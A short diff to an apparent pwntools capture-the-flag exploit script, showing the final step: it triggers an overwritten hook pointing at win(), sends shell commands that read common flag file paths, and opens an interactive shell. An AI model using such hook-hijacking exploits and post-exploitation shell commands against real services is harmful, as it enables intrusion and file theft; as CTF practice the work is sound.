@@ -139,6 +139,10 @@ log.success(f'win() ({hex(win)}) written to hook @ {hex(hook)}')
 # Step 8: trigger hook via exit (option 5)
 log.info('triggering hook via exit…')
 r.sendline(b'5')
-out = r.recvall(timeout=2)
-if out:
-    print(out.decode(errors='ignore'), end='')
+try:
+    # If win() drops us into a shell, proactively try common flag paths.
+    r.sendline(b'cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat flag 2>/dev/null || cat flag.txt 2>/dev/null')
+except EOFError:
+    pass
+
+r.interactive()
